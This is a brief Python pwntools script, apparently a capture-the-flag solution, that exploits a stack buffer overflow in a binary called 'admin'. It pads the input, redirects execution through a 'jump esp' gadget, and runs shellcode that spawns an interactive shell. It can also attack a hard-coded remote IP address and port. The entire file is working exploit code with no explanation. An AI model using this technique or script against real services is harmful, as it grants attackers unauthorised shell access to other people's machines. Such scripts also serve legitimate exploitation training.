#!/usr/bin/env python3

from pwn import *

PATH = './admin'

HOST = '103.191.63.187'
PORT = 5000

def exploit(r):
    payload  = b'A' * 0x40C
    payload += p32(0x08049199) # jump esp
    payload += asm(shellcraft.sh())
    
    r.recvlines(2)    
    r.sendline(payload)
    
    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH, checksec=True)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False, env={})

    exploit(r)
